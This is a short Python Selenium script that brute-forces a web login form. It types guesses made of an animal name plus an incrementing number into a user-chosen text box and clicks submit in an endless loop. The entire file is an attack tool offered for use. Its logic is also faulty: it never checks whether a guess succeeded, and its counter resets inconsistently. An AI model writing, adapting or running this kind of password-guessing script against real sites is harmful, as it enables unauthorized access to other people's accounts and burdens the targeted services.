from selenium import webdriver
import time
from animal_name_list import animal_ary

animal = animal_ary[0]
number = 100000000
con_num = str(number)
passwrd = animal + con_num
n = 0

website = input("ULR: ")
web = webdriver.Chrome()
web.get(website)
text_box = input("textbox: ")
submit_box = input("submit: ")
time.sleep(1)

success = False
while not success:
    box = web.find_element_by_xpath(text_box)
    box.send_keys(passwrd)
    submit = web.find_element_by_xpath(submit_box)
    submit.click()
    number += 1
    if number == 10000000000:
        number = 1000000000
        n += 1
        animal = animal_ary[n]
    con_num = str(number)
    passwrd = animal + con_num
    print(passwrd)
